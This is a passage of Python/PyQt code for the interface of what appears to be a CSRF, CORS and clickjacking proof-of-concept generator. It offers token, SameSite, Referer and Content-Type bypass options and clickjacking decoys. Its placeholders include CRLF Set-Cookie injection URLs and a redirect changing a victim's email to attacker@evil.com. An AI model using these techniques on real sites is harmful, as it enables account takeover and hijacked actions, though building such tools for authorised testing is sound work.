        test_type_row.addStretch()
        cors_opts_layout.addLayout(test_type_row)

        # ── Trusted Subdomain XSS sub-panel (shown only for that test type) ──
        self.subdomain_xss_group = QWidget()
        subdomain_xss_layout = QVBoxLayout(self.subdomain_xss_group)
        subdomain_xss_layout.setContentsMargins(0, 4, 0, 0)
        subdomain_xss_layout.setSpacing(6)

        self.subdomain_xss_check = QCheckBox("Subdomain is XSS-vulnerable (reflected XSS chain)")
        self.subdomain_xss_check.setChecked(False)
        self.subdomain_xss_check.setStyleSheet(f"color:{COLOR_TEXT};font-size:9pt;")
        self.subdomain_xss_check.stateChanged.connect(self._on_subdomain_xss_toggled)
        subdomain_xss_layout.addWidget(self.subdomain_xss_check)

        # XSS URL + parameter inputs (hidden until checkbox ticked)
        self.subdomain_xss_inputs = QWidget()
        xss_inputs_layout = QVBoxLayout(self.subdomain_xss_inputs)
        xss_inputs_layout.setContentsMargins(0, 2, 0, 0)
        xss_inputs_layout.setSpacing(5)

        xss_url_lbl = QLabel("XSS URL (vulnerable subdomain endpoint):")
        xss_url_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self.subdomain_xss_url = QLineEdit()
        self.subdomain_xss_url.setFixedHeight(24)
        self.subdomain_xss_url.setPlaceholderText(
            "http://stock.example.com/products?productId=1&storeId=1"
        )
        self.subdomain_xss_url.textChanged.connect(self._on_cors_option_changed)

        xss_param_lbl = QLabel("Vulnerable parameter (where XSS payload is injected):")
        xss_param_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self.subdomain_xss_param = QLineEdit()
        self.subdomain_xss_param.setFixedHeight(24)
        self.subdomain_xss_param.setPlaceholderText("productId")
        self.subdomain_xss_param.textChanged.connect(self._on_cors_option_changed)

        xss_inputs_layout.addWidget(xss_url_lbl)
        xss_inputs_layout.addWidget(self.subdomain_xss_url)
        xss_inputs_layout.addWidget(xss_param_lbl)
        xss_inputs_layout.addWidget(self.subdomain_xss_param)

        subdomain_xss_layout.addWidget(self.subdomain_xss_inputs)
        self.subdomain_xss_inputs.setVisible(False)  # hidden until checkbox ticked
        self.subdomain_xss_group.setVisible(False)    # hidden until test type selected

        cors_opts_layout.addWidget(self.subdomain_xss_group)
        
        config_layout.addWidget(self.cors_opts_group)
        
        # CSRF Options Group (only shown when CSRF is selected)
        self.csrf_opts_group = QWidget()
        self.csrf_opts_group.setObjectName("csrf_opts_group")
        csrf_opts_layout = QVBoxLayout(self.csrf_opts_group)
        csrf_opts_layout.setContentsMargins(0, 5, 0, 5)
        csrf_opts_layout.setSpacing(8)
        
        # Separator
        sep2 = QFrame()
        sep2.setFrameShape(QFrame.HLine)
        sep2.setStyleSheet(f"background-color:{COLOR_BORDER};max-height:1px;")
        csrf_opts_layout.addWidget(sep2)
        
        csrf_label = QLabel("CSRF Options:")
        csrf_label.setStyleSheet(f"color:{COLOR_ACCENT};font-size:9pt;font-weight:bold;")
        csrf_opts_layout.addWidget(csrf_label)

        # ── Bypass technique dropdown ──────────────────────────────────────
        bypass_row = QHBoxLayout()
        bypass_row.setSpacing(8)
        bypass_lbl = QLabel("Token Bypass:")
        bypass_lbl.setFixedWidth(140)
        bypass_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        self.csrf_bypass_combo = QComboBox()
        self.csrf_bypass_combo.setFixedHeight(26)
        self.csrf_bypass_combo.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self.csrf_bypass_combo.addItems([
            # No bypass
            "None",
            # Category 1 – CSRF token validation
            "Token validation – Request method",
            CSRFGenerator.BYPASS_HEAD_METHOD,
            "Token validation – Token absent",
            CSRFGenerator.BYPASS_TOKEN_EMPTY,
            "Token validation – Not tied to user session (verify tokens against a global pool)",
            CSRFGenerator.BYPASS_TOKEN_VERIFIED_BY_COOKIE,
            # ── Method override ──────────────────────────────────────────
            CSRFGenerator.BYPASS_METHOD_OVERRIDE_DELETE,
            CSRFGenerator.BYPASS_METHOD_OVERRIDE_PUT,
            CSRFGenerator.BYPASS_METHOD_OVERRIDE_PATCH,
            # ── Custom header ────────────────────────────────────────────
            CSRFGenerator.BYPASS_CUSTOM_HEADER_ABSENT,
        ])
        self.csrf_bypass_combo.currentTextChanged.connect(self._on_csrf_bypass_changed)
        bypass_row.addWidget(bypass_lbl)
        bypass_row.addWidget(self.csrf_bypass_combo, 1)

        self.csrf_test_btn = QPushButton("Test")
        self.csrf_test_btn.setFixedHeight(26)
        self.csrf_test_btn.setFixedWidth(70)
        self.csrf_test_btn.setToolTip(
            "Send probe requests to detect which CSRF mechanisms are active\n"
            "and suggest the best bypass technique automatically.")
        self.csrf_test_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};"
            f"border:1px solid {COLOR_ACCENT};border-radius:4px;padding:0 6px;}}"
            f"QPushButton:hover{{background:{COLOR_ACCENT};color:#000;}}"
        )
        self.csrf_test_btn.clicked.connect(self._open_csrf_tester)
        bypass_row.addWidget(self.csrf_test_btn)

        csrf_opts_layout.addLayout(bypass_row)

        # Description label — updates when technique changes
        self.csrf_bypass_desc = QLabel("")
        self.csrf_bypass_desc.setWordWrap(True)
        self.csrf_bypass_desc.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:8pt;"
            f"background:{COLOR_DARK_BG};border-radius:3px;padding:4px 6px;"
        )
        self.csrf_bypass_desc.setVisible(False)
        csrf_opts_layout.addWidget(self.csrf_bypass_desc)

        # ── Non-session cookie sub-panel ───────────────────────────────────
        self.nsc_group = QWidget()
        nsc_layout = QVBoxLayout(self.nsc_group)
        nsc_layout.setContentsMargins(0, 4, 0, 0)
        nsc_layout.setSpacing(5)

        def _field(placeholder, hint_text):
            lbl = QLabel(hint_text)
            lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
            edt = QLineEdit()
            edt.setFixedHeight(24)
            edt.setPlaceholderText(placeholder)
            edt.textChanged.connect(self._on_csrf_option_changed)
            return lbl, edt

        nsc_key_lbl, self.nsc_csrf_key  = _field(
            "rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv",
            "Your csrfKey cookie value (from your own account):")
        nsc_tok_lbl, self.nsc_csrf_token = _field(
            "RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY",
            "Your csrf token value (paired with the csrfKey above):")
        nsc_inj_lbl, self.nsc_inject_url = _field(
            "https://TARGET/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None",
            "Cookie-injection URL (endpoint that reflects input into Set-Cookie):")

        for lbl, edt in [(nsc_key_lbl, self.nsc_csrf_key),
                         (nsc_tok_lbl, self.nsc_csrf_token),
                         (nsc_inj_lbl, self.nsc_inject_url)]:
            nsc_layout.addWidget(lbl)
            nsc_layout.addWidget(edt)

        nsc_hint = QLabel(
            "💡 Obtain your csrfKey + token by logging in with your own account. "
            "The injection URL is an endpoint whose input is reflected into Set-Cookie "
            "(e.g. a search param). The PoC injects your csrfKey into the victim's "
            "browser, then submits the form with your matching token.")
        nsc_hint.setWordWrap(True)
        nsc_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-style:italic;")
        nsc_layout.addWidget(nsc_hint)

        self.nsc_group.setVisible(False)
        csrf_opts_layout.addWidget(self.nsc_group)

        # ── Double-submit cookie sub-panel ─────────────────────────────────
        self.ds_group = QWidget()
        ds_layout = QVBoxLayout(self.ds_group)
        ds_layout.setContentsMargins(0, 4, 0, 0)
        ds_layout.setSpacing(5)

        ds_tok_lbl = QLabel("Fake token value (anything you choose, e.g. 'fake'):")
        ds_tok_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self.ds_fake_token = QLineEdit()
        self.ds_fake_token.setFixedHeight(24)
        self.ds_fake_token.setPlaceholderText("fake")
        self.ds_fake_token.setText("fake")
        self.ds_fake_token.textChanged.connect(self._on_csrf_option_changed)

        ds_inj_lbl = QLabel("Cookie-injection URL (reflects input into Set-Cookie header):")
        ds_inj_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self.ds_inject_url = QLineEdit()
        self.ds_inject_url.setFixedHeight(24)
        self.ds_inject_url.setPlaceholderText(
            "https://TARGET/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None")
        self.ds_inject_url.textChanged.connect(self._on_csrf_option_changed)

        ds_hint = QLabel(
            "💡 No valid account needed. The server only checks that the csrf cookie "
            "equals the csrf body parameter — so any invented value works. The PoC "
            "injects your fake token as the csrf cookie, then submits the form with "
            "the same fake token in the body.")
        ds_hint.setWordWrap(True)
        ds_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-style:italic;")

        ds_layout.addWidget(ds_tok_lbl)
        ds_layout.addWidget(self.ds_fake_token)
        ds_layout.addWidget(ds_inj_lbl)
        ds_layout.addWidget(self.ds_inject_url)
        ds_layout.addWidget(ds_hint)

        self.ds_group.setVisible(False)
        csrf_opts_layout.addWidget(self.ds_group)

        # ── Token verified by cookie sub-panel ───────────────────────────────────
        self.tvc_group = QWidget()
        tvc_layout = QVBoxLayout(self.tvc_group)
        tvc_layout.setContentsMargins(0, 4, 0, 0)
        tvc_layout.setSpacing(5)

        tvc_inj_lbl = QLabel("Cookie-injection URL (reflects input into Set-Cookie header):")
        tvc_inj_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self.tvc_inject_url = QLineEdit()
        self.tvc_inject_url.setFixedHeight(24)
        self.tvc_inject_url.setPlaceholderText(
            "https://TARGET/?search=test%0d%0aSet-Cookie:%20csrf=TOKEN%3b%20SameSite=None")
        self.tvc_inject_url.textChanged.connect(self._on_csrf_option_changed)

        tvc_hint = QLabel(
            "💡 Two sub-cases: "
            "① Double-submit — cookie value == body token (any value works, just make them match). "
            "② Non-session bound — cookie (e.g. csrfKey) and body token are different but linked "
            "(use your own csrfKey + its corresponding token). "
            "In both cases: inject the cookie value via the URL above, then set the hidden token "
            "field in the form to the matching value before submitting.")
        tvc_hint.setWordWrap(True)
        tvc_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-style:italic;")

        tvc_layout.addWidget(tvc_inj_lbl)
        tvc_layout.addWidget(self.tvc_inject_url)
        tvc_layout.addWidget(tvc_hint)

        self.tvc_group.setVisible(False)
        csrf_opts_layout.addWidget(self.tvc_group)

        # ── Custom header sub-panel ─────────────────────────────────────────
        self.ch_group = QWidget()
        ch_layout = QVBoxLayout(self.ch_group)
        ch_layout.setContentsMargins(0, 4, 0, 0)
        ch_layout.setSpacing(5)

        ch_hdr_lbl = QLabel("CSRF header name (e.g. X-CSRF-Token, X-XSRF-TOKEN):")
        ch_hdr_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self.ch_header_name = QLineEdit()
        self.ch_header_name.setFixedHeight(24)
        self.ch_header_name.setPlaceholderText("X-CSRF-Token")
        self.ch_header_name.setText("X-CSRF-Token")
        self.ch_header_name.textChanged.connect(self._on_csrf_option_changed)

        ch_hint = QLabel(
            "\ud83d\udca1 HTML forms cannot set custom headers \u2014 the browser blocks cross-origin "
            "custom headers. The PoC sends a fetch() request without the named header to "
            "confirm the server accepts requests without it.\n"
            "Also try: X-XSRF-TOKEN, X-RequestedWith, x-csrf-token, etc.")
        ch_hint.setWordWrap(True)
        ch_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-style:italic;")

        ch_layout.addWidget(ch_hdr_lbl)
        ch_layout.addWidget(self.ch_header_name)
        ch_layout.addWidget(ch_hint)

        self.ch_group.setVisible(False)
        csrf_opts_layout.addWidget(self.ch_group)

        # ── SameSite bypass dropdown ───────────────────────────────────────
        sep_samesite = QFrame()
        sep_samesite.setFrameShape(QFrame.HLine)
        sep_samesite.setStyleSheet(f"background-color:{COLOR_BORDER};max-height:1px;")
        csrf_opts_layout.addWidget(sep_samesite)

        samesite_row = QHBoxLayout()
        samesite_row.setSpacing(8)
        samesite_tech_lbl = QLabel("SameSite Bypass:")
        samesite_tech_lbl.setFixedWidth(140)
        samesite_tech_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        self.samesite_bypass_combo = QComboBox()
        self.samesite_bypass_combo.setFixedHeight(26)
        self.samesite_bypass_combo.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self.samesite_bypass_combo.addItems([
            "None",
            "Lax \u2013 GET request override (_method=POST)",
            "Strict \u2013 Client-side Redirect",
        ])
        self.samesite_bypass_combo.currentTextChanged.connect(self._on_samesite_bypass_changed)
        samesite_row.addWidget(samesite_tech_lbl)
        samesite_row.addWidget(self.samesite_bypass_combo, 1)

        self.samesite_test_btn = QPushButton("Test")
        self.samesite_test_btn.setFixedHeight(26)
        self.samesite_test_btn.setFixedWidth(70)
        self.samesite_test_btn.setToolTip(
            "Send probe requests to verify whether the SameSite Lax\n"
            "GET request override bypass works against the target server."
        )
        self.samesite_test_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};"
            f"border:1px solid {COLOR_ACCENT};border-radius:4px;padding:0 6px;}}"
            f"QPushButton:hover{{background:{COLOR_ACCENT};color:#000;}}"
        )
        self.samesite_test_btn.clicked.connect(self._open_samesite_tester)
        samesite_row.addWidget(self.samesite_test_btn)

        csrf_opts_layout.addLayout(samesite_row)

        # ── Strict Client-side Redirect URL input ──────────────────────────
        self.samesite_redirect_widget = QWidget()
        sr_layout = QVBoxLayout(self.samesite_redirect_widget)
        sr_layout.setContentsMargins(0, 4, 0, 0)
        sr_layout.setSpacing(3)
        sr_lbl = QLabel("Redirect URL (gadget on target site that redirects to the attack):")
        sr_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self.samesite_redirect_url = QLineEdit()
        self.samesite_redirect_url.setFixedHeight(26)
        self.samesite_redirect_url.setPlaceholderText(
            "https://target.com/post/comment/confirmation?postId="
            "../my-account/change-email%3Femail%3Dattacker%40evil.com%26submit%3D1"
        )
        self.samesite_redirect_url.setStyleSheet(
            f"QLineEdit{{background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;padding:0 4px;}}"
            f"QLineEdit:focus{{border-color:{COLOR_ACCENT};}}"
        )
        self.samesite_redirect_url.textChanged.connect(self._on_samesite_redirect_changed)
        sr_layout.addWidget(sr_lbl)
        sr_layout.addWidget(self.samesite_redirect_url)
        self.samesite_redirect_widget.setVisible(False)
        csrf_opts_layout.addWidget(self.samesite_redirect_widget)

        self.samesite_bypass_desc = QLabel("")
        self.samesite_bypass_desc.setWordWrap(True)
        self.samesite_bypass_desc.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:8pt;"
            f"background:{COLOR_DARK_BG};border-radius:3px;padding:4px 6px;"
        )
        self.samesite_bypass_desc.setVisible(False)
        csrf_opts_layout.addWidget(self.samesite_bypass_desc)

        # ── Referer header bypass dropdown ────────────────────────────────────
        sep_referer = QFrame()
        sep_referer.setFrameShape(QFrame.HLine)
        sep_referer.setStyleSheet(f"background-color:{COLOR_BORDER};max-height:1px;")
        csrf_opts_layout.addWidget(sep_referer)

        referer_row = QHBoxLayout()
        referer_row.setSpacing(8)
        referer_tech_lbl = QLabel("Referer Bypass:")
        referer_tech_lbl.setFixedWidth(140)
        referer_tech_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        self.referer_bypass_combo = QComboBox()
        self.referer_bypass_combo.setFixedHeight(26)
        self.referer_bypass_combo.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self.referer_bypass_combo.addItems([
            "None",
            "Absent \u2013 Validation depends on header being present",
            "Circumvent \u2013 Validation can be bypassed (query string trick)",
        ])
        self.referer_bypass_combo.currentTextChanged.connect(self._on_referer_bypass_changed)
        referer_row.addWidget(referer_tech_lbl)
        referer_row.addWidget(self.referer_bypass_combo, 1)

        self.referer_test_btn = QPushButton("Test")
        self.referer_test_btn.setFixedHeight(26)
        self.referer_test_btn.setFixedWidth(70)
        self.referer_test_btn.setToolTip(
            "Send probe requests to verify whether the Referer header\n"
            "bypass technique works against the target server."
        )
        self.referer_test_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};"
            f"border:1px solid {COLOR_ACCENT};border-radius:4px;padding:0 6px;}}"
            f"QPushButton:hover{{background:{COLOR_ACCENT};color:#000;}}"
        )
        self.referer_test_btn.clicked.connect(self._open_referer_tester)
        referer_row.addWidget(self.referer_test_btn)
        csrf_opts_layout.addLayout(referer_row)

        self.referer_bypass_desc = QTextEdit()
        self.referer_bypass_desc.setReadOnly(True)
        self.referer_bypass_desc.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.referer_bypass_desc.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.referer_bypass_desc.setFrameShape(QFrame.NoFrame)
        self.referer_bypass_desc.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self.referer_bypass_desc.setFixedHeight(0)
        self.referer_bypass_desc.setStyleSheet(
            f"QTextEdit{{color:{COLOR_TEXT_MUTED};font-size:8pt;"
            f"background:{COLOR_DARK_BG};border-radius:3px;padding:4px 6px;border:none;}}"
        )
        self.referer_bypass_desc.setVisible(False)
        csrf_opts_layout.addWidget(self.referer_bypass_desc)

        # ── Content-Type bypass dropdown ────────────────────────────────────
        sep_ct = QFrame()
        sep_ct.setFrameShape(QFrame.HLine)
        sep_ct.setStyleSheet(f"background-color:{COLOR_BORDER};max-height:1px;")
        csrf_opts_layout.addWidget(sep_ct)

        ct_row = QHBoxLayout()
        ct_row.setSpacing(8)
        ct_tech_lbl = QLabel("Content-Type Bypass:")
        ct_tech_lbl.setFixedWidth(140)
        ct_tech_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        self.ct_bypass_combo = QComboBox()
        self.ct_bypass_combo.setFixedHeight(26)
        self.ct_bypass_combo.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self.ct_bypass_combo.addItems([
            "None",
            "text/plain",
            CSRFGenerator.BYPASS_CT_PLAIN_JSON,
            CSRFGenerator.BYPASS_CT_FORM_JSON,
            "multipart/form-data",
            "application/x-www-form-urlencoded",
            "application/json",
        ])
        self.ct_bypass_combo.currentTextChanged.connect(self._on_ct_bypass_changed)
        ct_row.addWidget(ct_tech_lbl)
        ct_row.addWidget(self.ct_bypass_combo, 1)

        self.ct_test_btn = QPushButton("Test")
        self.ct_test_btn.setFixedHeight(26)
        self.ct_test_btn.setFixedWidth(70)
        self.ct_test_btn.setToolTip(
            "Send probe requests to verify how the server handles\n"
            "different Content-Type values (plain text, form-encoded,\n"
            "JSON, absent header, etc.)."
        )
        self.ct_test_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};"
            f"border:1px solid {COLOR_ACCENT};border-radius:4px;padding:0 6px;}}"
            f"QPushButton:hover{{background:{COLOR_ACCENT};color:#000;}}"
        )
        self.ct_test_btn.clicked.connect(self._open_ct_tester)
        ct_row.addWidget(self.ct_test_btn)
        csrf_opts_layout.addLayout(ct_row)

        self.ct_bypass_desc = QTextEdit()
        self.ct_bypass_desc.setReadOnly(True)
        self.ct_bypass_desc.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.ct_bypass_desc.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.ct_bypass_desc.setFrameShape(QFrame.NoFrame)
        self.ct_bypass_desc.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self.ct_bypass_desc.setFixedHeight(0)
        self.ct_bypass_desc.setStyleSheet(
            f"QTextEdit{{color:{COLOR_TEXT_MUTED};font-size:8pt;"
            f"background:{COLOR_DARK_BG};border-radius:3px;padding:4px 6px;border:none;}}"
        )
        self.ct_bypass_desc.setVisible(False)
        csrf_opts_layout.addWidget(self.ct_bypass_desc)

        sep_csrf_opts = QFrame()
        sep_csrf_opts.setFrameShape(QFrame.HLine)
        sep_csrf_opts.setStyleSheet(f"background-color:{COLOR_BORDER};max-height:1px;")
        csrf_opts_layout.addWidget(sep_csrf_opts)

        
        self.csrf_auto_submit = QCheckBox("Auto-submit form on page load")
        self.csrf_auto_submit.setChecked(True)
        self.csrf_auto_submit.setStyleSheet(f"color:{COLOR_TEXT};")
        csrf_opts_layout.addWidget(self.csrf_auto_submit)
        
        self.csrf_new_tab = QCheckBox("Open result in new tab (target='_blank')")
        self.csrf_new_tab.setChecked(False)
        self.csrf_new_tab.setStyleSheet(f"color:{COLOR_TEXT};")
        csrf_opts_layout.addWidget(self.csrf_new_tab)
        
        config_layout.addWidget(self.csrf_opts_group)

        # ── Clickjacking Options Group ──────────────────────────────────────
        self.cj_opts_group = QWidget()
        self.cj_opts_group.setObjectName("cj_opts_group")
        cj_opts_layout = QVBoxLayout(self.cj_opts_group)
        cj_opts_layout.setContentsMargins(0, 5, 0, 5)
        cj_opts_layout.setSpacing(8)

        sep_cj = QFrame()
        sep_cj.setFrameShape(QFrame.HLine)
        sep_cj.setStyleSheet(f"background-color:{COLOR_BORDER};max-height:1px;")
        cj_opts_layout.addWidget(sep_cj)

        cj_label = QLabel("Clickjacking Options:")
        cj_label.setStyleSheet(f"color:{COLOR_ACCENT};font-size:9pt;font-weight:bold;")
        cj_opts_layout.addWidget(cj_label)

        # ── Target URL ────────────────────────────────────────────────────
        cj_url_lbl = QLabel("Target URL (page to load in iframe):")
        cj_url_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        cj_opts_layout.addWidget(cj_url_lbl)

        cj_url_row = QHBoxLayout()
        cj_url_row.setSpacing(6)
        self.cj_target_url = QLineEdit()
        self.cj_target_url.setFixedHeight(24)
        self.cj_target_url.setPlaceholderText("https://target.com/account/delete")
        self.cj_target_url.textChanged.connect(self._on_cj_option_changed)
        cj_url_row.addWidget(self.cj_target_url, 1)

        cj_autofill_btn = QPushButton("Auto-fill")
        cj_autofill_btn.setFixedHeight(24)
        cj_autofill_btn.setFixedWidth(70)
        cj_autofill_btn.setToolTip("Fill target URL from the pasted HTTP request")
        cj_autofill_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};"
            f"border:1px solid {COLOR_ACCENT};border-radius:4px;padding:0 6px;}}"
            f"QPushButton:hover{{background:{COLOR_ACCENT};color:#000;}}"
        )
        cj_autofill_btn.clicked.connect(self._cj_autofill_url)
        cj_url_row.addWidget(cj_autofill_btn)
        cj_opts_layout.addLayout(cj_url_row)

        cj_url_hint = QLabel(
            "💡 If the target page contains a form that needs to be pre-filled "
            "(e.g. an email field), pass the values via the query string using GET — "
            "example: https://www.ex.com/my-account?email=hacker@mail.com"
        )
        cj_url_hint.setWordWrap(True)
        cj_url_hint.setStyleSheet("color:#f1c40f;font-size:8pt;font-style:italic;")
        cj_opts_layout.addWidget(cj_url_hint)

        # ── Decoy text + Style + Align button (single row) ───────────────
        cj_decoy_row = QHBoxLayout()
        cj_decoy_row.setSpacing(8)

        cj_decoy_txt_lbl = QLabel("Decoy text:")
        cj_decoy_txt_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        cj_decoy_row.addWidget(cj_decoy_txt_lbl)

        self.cj_decoy_text = QLineEdit()
        self.cj_decoy_text.setFixedHeight(24)
        self.cj_decoy_text.setPlaceholderText("🎁 Claim your prize!")
        self.cj_decoy_text.setText("🎁 Claim your prize!")
        self.cj_decoy_text.textChanged.connect(self._on_cj_option_changed)
        cj_decoy_row.addWidget(self.cj_decoy_text, 2)

        cj_style_lbl = QLabel("Style:")
        cj_style_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        cj_decoy_row.addWidget(cj_style_lbl)

        self.cj_decoy_style_combo = QComboBox()
        self.cj_decoy_style_combo.addItems(list(ClickjackingPoCGenerator.DECOY_STYLES.keys()))
        self.cj_decoy_style_combo.setFixedHeight(24)
        self.cj_decoy_style_combo.setSizePolicy(QSizePolicy.Preferred, QSizePolicy.Fixed)
        self.cj_decoy_style_combo.currentTextChanged.connect(self._on_cj_style_preset_changed)
        cj_decoy_row.addWidget(self.cj_decoy_style_combo, 1)

        self.cj_align_btn = QPushButton(" Align in Browser")
        self.cj_align_btn.setFixedHeight(24)
        self.cj_align_btn.setToolTip(
            "Opens a test-mode page in your browser where you can visually adjust\n"
            "the iframe position and decoy button placement.\n"
            "Click '✅ Send to PoC Tool' in the browser toolbar to automatically\n"
            "update the spinboxes and regenerate the clean PoC here."
        )
        self.cj_align_btn.setStyleSheet(
            "QPushButton{background:#27ae60;color:#fff;"
            "border:1px solid #219a52;border-radius:4px;padding:0 10px;"
            "font-weight:bold;}"
            "QPushButton:hover{background:#2ecc71;}"
        )
        self.cj_align_btn.clicked.connect(self._align_in_browser)
        cj_decoy_row.addWidget(self.cj_align_btn)

        cj_opts_layout.addLayout(cj_decoy_row)

        # ── Multistep checkbox ────────────────────────────────────────────
        self.cj_multistep = QCheckBox("Multistep clickjacking")
        self.cj_multistep.setStyleSheet(f"color:{COLOR_TEXT};font-size:8pt;")
        self.cj_multistep.stateChanged.connect(self._on_cj_option_changed)
        cj_opts_layout.addWidget(self.cj_multistep)

        # Second decoy text (shown only when multistep is checked)
        self.cj_multistep_row = QWidget()
        ms_row_layout = QHBoxLayout(self.cj_multistep_row)
        ms_row_layout.setContentsMargins(0, 0, 0, 0)
        ms_row_layout.setSpacing(8)
        cj_decoy2_lbl = QLabel("2nd decoy text:")
        cj_decoy2_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        ms_row_layout.addWidget(cj_decoy2_lbl)
        self.cj_decoy_text2 = QLineEdit()
        self.cj_decoy_text2.setFixedHeight(24)
        self.cj_decoy_text2.setPlaceholderText("Click me next")
        self.cj_decoy_text2.setText("Click me next")
        self.cj_decoy_text2.textChanged.connect(self._on_cj_option_changed)
        ms_row_layout.addWidget(self.cj_decoy_text2, 1)
        self.cj_multistep_row.setVisible(False)
        cj_opts_layout.addWidget(self.cj_multistep_row)
        self.cj_multistep.stateChanged.connect(
            lambda s: self.cj_multistep_row.setVisible(bool(s)))

        # Hidden position spinboxes — values set by alignment server callback
        self.cj_decoy_x = QSpinBox()
        self.cj_decoy_x.setRange(0, 9999)
        self.cj_decoy_x.setValue(200)
        self.cj_decoy_x.valueChanged.connect(self._on_cj_option_changed)

        self.cj_decoy_y = QSpinBox()
        self.cj_decoy_y.setRange(0, 9999)
        self.cj_decoy_y.setValue(200)
        self.cj_decoy_y.valueChanged.connect(self._on_cj_option_changed)

        # Hidden second-click position spinboxes (multistep)
        self.cj_decoy_x2 = QSpinBox()
        self.cj_decoy_x2.setRange(0, 9999)
        self.cj_decoy_x2.setValue(400)
        self.cj_decoy_x2.valueChanged.connect(self._on_cj_option_changed)

        self.cj_decoy_y2 = QSpinBox()
        self.cj_decoy_y2.setRange(0, 9999)
        self.cj_decoy_y2.setValue(400)
        self.cj_decoy_y2.valueChanged.connect(self._on_cj_option_changed)

        # Hidden iframe offset spinboxes — set by alignment server callback
        self.cj_x_offset = QSpinBox()
        self.cj_x_offset.setRange(-2000, 2000)
        self.cj_x_offset.setValue(0)
        self.cj_x_offset.valueChanged.connect(self._on_cj_option_changed)

        self.cj_y_offset = QSpinBox()
        self.cj_y_offset.setRange(-2000, 2000)
        self.cj_y_offset.setValue(0)
        self.cj_y_offset.valueChanged.connect(self._on_cj_option_changed)

        # Hidden decoy size spinboxes — set by alignment server callback
        self.cj_decoy_w = QSpinBox()
        self.cj_decoy_w.setRange(0, 2000)
        self.cj_decoy_w.setValue(0)
        self.cj_decoy_w.valueChanged.connect(self._on_cj_option_changed)

        self.cj_decoy_h = QSpinBox()
        self.cj_decoy_h.setRange(0, 2000)
        self.cj_decoy_h.setValue(0)
        self.cj_decoy_h.valueChanged.connect(self._on_cj_option_changed)

        # Hidden iframe size spinboxes — set by alignment server callback
        self.cj_iframe_w = QSpinBox()
        self.cj_iframe_w.setRange(100, 9999)
        self.cj_iframe_w.setValue(1280)
        self.cj_iframe_w.valueChanged.connect(self._on_cj_option_changed)

        self.cj_iframe_h = QSpinBox()
        self.cj_iframe_h.setRange(100, 9999)
        self.cj_iframe_h.setValue(800)
        self.cj_iframe_h.valueChanged.connect(self._on_cj_option_changed)

        # Hidden font-size spinbox — set by alignment server callback
        self.cj_decoy_fs = QSpinBox()
        self.cj_decoy_fs.setRange(6, 120)
        self.cj_decoy_fs.setValue(16)
        self.cj_decoy_fs.valueChanged.connect(self._on_cj_option_changed)

        # ── Sandbox ───────────────────────────────────────────────────────
        cj_sb_lbl = QLabel("Sandbox iframe:")
        cj_sb_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        cj_opts_layout.addWidget(cj_sb_lbl)

        cj_sb_row = QHBoxLayout()
        cj_sb_row.setSpacing(12)

        self.cj_sb_scripts = QCheckBox("allow-scripts")
        self.cj_sb_scripts.setStyleSheet(f"color:{COLOR_TEXT};font-size:8pt;")
        self.cj_sb_scripts.stateChanged.connect(self._on_cj_sandbox_changed)

        self.cj_sb_forms = QCheckBox("allow-forms")
        self.cj_sb_forms.setStyleSheet(f"color:{COLOR_TEXT};font-size:8pt;")
        self.cj_sb_forms.stateChanged.connect(self._on_cj_sandbox_changed)

        self.cj_sb_origin = QCheckBox("allow-same-origin")
